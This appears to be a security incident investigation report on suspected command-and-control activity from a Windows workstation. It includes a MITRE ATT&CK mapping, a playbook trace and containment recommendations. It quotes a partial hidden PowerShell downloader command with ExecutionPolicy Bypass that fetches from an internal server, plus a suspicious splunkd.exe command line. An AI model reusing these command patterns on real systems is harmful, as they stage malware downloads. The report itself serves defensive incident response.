# INVESTIGATION SUMMARY: INC-53021 (Incident-003)

**Final Severity:** High
*High severity is appropriate because the case contains strong indicators of active malicious activity on an important internal endpoint: hidden PowerShell execution with ExecutionPolicy Bypass, suspicious use of splunkd.exe, repeated internal command-and-control alerts, and a likely downloader contacting 192.168.10.202:8888 and acmecorp-reset.com. The evidence supports suspected compromise and possible tool staging/C2, but there is no confirmed ransomware, widespread outage, data exfiltration, or verified critical-system impact to justify Critical.*

**Confidence Level:** High
*Confidence is High because multiple aligned sources support the conclusion: NetWitness sub-alerts repeated the same C2 pattern, the command lines are explicit, the host/user context is consistent, and threat intelligence elevated the file hashes with malicious detections. Evidence is sufficient and internally consistent, with only limited uncertainty around the exact privilege-escalation outcome and whether lateral movement occurred.*

## Investigative Workflow
- Reviewed the six NetWitness sub-alerts associated with INC-53021.
- Validated the active user context as KELLYWANG\Kelly Wang and the host as KELLYWANG.
- Correlated the repeated internal connection pattern to 192.168.10.202 and domain acmecorp-reset.com.
- Identified suspicious powershell.exe execution with hidden window and ExecutionPolicy Bypass.
- Identified suspicious splunkd.exe execution with custom server and group arguments.
- Assessed need for containment and escalation based on repeated C2 indicators and downloader behavior.

## Technical Chronology & MITRE ATT&CK TTP Mapping

On 2025-12-01T07:33:35.204Z, the host KELLYWANG running under the user context KELLYWANG\Kelly Wang generated the first of six NetWitness endpoint alerts for a Potential C2 Connection. The source was 192.168.10.204 and the target was 192.168.10.202, with the observed domain acmecorp-reset.com and a connection label tying the activity to KELLYWANG. The same pattern repeated at 07:33:35.299Z, 07:33:36.260Z, 07:33:36.262Z, and 07:33:36.268Z, all showing the same internal source and destination, the same user and host context, and the same domain association, indicating repeated command-and-control style communication in a very short interval. The alert set also captured suspicious endpoint execution on Windows: powershell.exe was run with -WindowStyle Hidden -ExecutionPolicy Bypass and a command that defined $server='http://192.168.10.202:8888', built a '/file/download' URL, created a System.Net.WebClient object, and added custom headers including platform='windows'. In parallel, splunkd.exe was executed with the command line 'splunkd.exe -server http://192.168.10.202:8888 -group red', which is inconsistent with normal Splunk daemon behavior on a workstation and aligns with suspicious tool abuse or staging activity. The telemetry shows internal network communication between 192.168.10.204 and 192.168.10.202:8888, repeated C2-style alerts, hidden PowerShell execution, and execution of a legitimate-looking binary with malicious-looking parameters, but it does not provide direct evidence of completed privilege escalation, lateral movement, or data exfiltration beyond the observed command-and-control and download behavior.

| Timeline Phase / Activity | Observed Evidence | MITRE Tactic | MITRE Technique Name | MITRE ID |
| --- | --- | --- | --- | --- |
| Initial user/host activity and process launch | Host KELLYWANG under user KELLYWANG\Kelly Wang on 192.168.10.204 begins suspicious activity tied to NetWitness case INC-53021. | Execution | Command and Scripting Interpreter | T1059 |
| Hidden PowerShell downloader execution | powershell.exe executed with '-WindowStyle Hidden -ExecutionPolicy Bypass -Command " $server=\'http://192.168.10.202:8888\'; $url=$server + \'/file/download\'; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\'platform\',\'windows\'); ..."' | Defense Evasion | PowerShell | T1059.001 |
| Downloader and remote retrieval over internal C2 endpoint | PowerShell WebClient connects to http://192.168.10.202:8888/file/download with custom headers and retrieves content from internal IP 192.168.10.202. | Command and Control | Ingress Tool Transfer | T1105 |
| Abuse of a legitimate-looking binary for suspicious network staging | splunkd.exe executed with command line 'splunkd.exe -server http://192.168.10.202:8888 -group red' from the KELLYWANG host. | Persistence | System Services | T1543 |
| Repeated internal beaconing / C2 alerts | Six NetWitness alerts flagged 'Potential C2 Connection (Kelly)' from 192.168.10.204 to 192.168.10.202, all associated with domain acmecorp-reset.com within seconds. | Command and Control | Application Layer Protocol | T1071 |
| Potential use of trusted process or masqueraded tooling to conceal malicious activity | Repeated C2-style activity and unusual splunkd.exe usage on Windows endpoint KELLYWANG suggest masquerading or abuse of a legitimate utility. | Defense Evasion | Masquerading | T1036 |

## Playbook Execution Trace
| Step ID | Instruction | Status | Findings |
| --- | --- | --- | --- |
| `step_1` | Identify 1. username 2. IP address 3. Login Details 4. Computer name 5. Operating System | **MET** | Identified user context as KELLYWANG\Kelly Wang on host KELLYWANG. Observed source IP 192.168.10.204 and destination/internal target 192.168.10.202. The timeline does not include a discrete logon event or logon type, but the active user context is present in the NetWitness alerts. Operating system is Windows. |
| `step_2` | Was it horizontal or vertical | **NOT_MET** | The telemetry shows internal-to-internal communication from 192.168.10.204 to 192.168.10.202, but there is insufficient evidence to classify the movement as horizontal or vertical. No corroborating remote logon, service creation, or explicit lateral-movement artifact is provided in the timeline. |
| `step_3` | Was any malicious process spawned on the victim's machine? | **MET** | Yes. The endpoint executed powershell.exe with -WindowStyle Hidden and -ExecutionPolicy Bypass running a download command against http://192.168.10.202:8888/file/download. The timeline also shows splunkd.exe launched with suspicious arguments '-server http://192.168.10.202:8888 -group red'. |
| `step_4` | Analyze the process tree for signs of malicious activity, such as privilege escalation, lateral movement, or data exfiltration. | **MET** | The process activity is strongly suspicious and consistent with malicious tradecraft. Hidden PowerShell used WebClient download behavior to contact 192.168.10.202:8888, and repeated NetWitness alerts flagged Potential C2 Connection to acmecorp-reset.com with source 192.168.10.204 and destination 192.168.10.202. The splunkd.exe execution from Public with custom arguments suggests abuse of a legitimate binary for command-and-control or staging. No confirmed privilege escalation or data exfiltration is explicitly shown, but repeated C2 activity and tool-transfer behavior are present. |
| `step_5` | Based on the analysis, determine if further investigation is necessary and the containment steps | **MET** | Further investigation and immediate containment are warranted. Recommended actions include isolating host KELLYWANG/192.168.10.204, blocking 192.168.10.202 and acmecorp-reset.com at network controls, terminating the suspicious PowerShell and splunkd processes, preserving volatile evidence, and collecting endpoint telemetry and command-line history. Credential validation/reset for KELLYWANG\Kelly Wang should be performed if compromise is confirmed. |

## Recommended Containment Actions
- Immediately isolate host KELLYWANG (192.168.10.204) from the network using EDR network containment while preserving local evidence.
- Add an explicit temporary block at perimeter, proxy, and internal segmentation controls for destination 192.168.10.202 and the domain acmecorp-reset.com, including any resolved IPs and related URLs such as /file/download on port 8888.
- Terminate the active powershell.exe process launched with -WindowStyle Hidden -ExecutionPolicy Bypass and the suspicious splunkd.exe instance running with '-server http://192.168.10.202:8888 -group red'.
- Acquire volatile artifacts from KELLYWANG before reimaging or cleanup, including memory capture, process tree, command-line history, network connections, and Prefetch/Amcache/Shimcache where available.
- Search enterprise EDR, DNS, proxy, and firewall telemetry for any additional hosts communicating with 192.168.10.202 or acmecorp-reset.com and quarantine any systems showing the same pattern.
- Reset and review credentials for KELLYWANG\Kelly Wang if there is any evidence of credential exposure, and invalidate active sessions/tokens associated with the account.
- Hunt for the downloaded payload referenced by the WebClient '/file/download' request and remove any persistence, scheduled tasks, services, or startup artifacts associated with it.

## Appendix M: Policy-Based Compliance Audit Log

| Audit ID | Decision Point | Policy Reference | Input Summary | Result | Decision Made | Human Review? | Timestamp |
| --- | --- | --- | --- | --- | --- | --- | --- |
| `AUD-DP07-1791302145-1` | **DP-07** | Appendix C | Critical System: False, Sensitive Data: False | *Pass* | `Investigate` | Yes | 2026-10-06T15:55:45Z |
| `AUD-DP08-1791302145-2` | **DP-08** | Appendix A | Severity classification: High | *Warning* | `Escalate` | Yes | 2026-10-06T15:55:45Z |
| `AUD-DP09-1791302145-3` | **DP-09** | Appendix F | Confidence level: High | *Pass* | `Investigate` | Yes | 2026-10-06T15:55:45Z |
| `AUD-DP10-1791302145-4` | **DP-10/DP-11** | Appendix G | Severity: High, Confidence: High, Ransomware: False, Guest OS: False | *Fail* | `Escalate` | Yes | 2026-10-06T15:55:45Z |
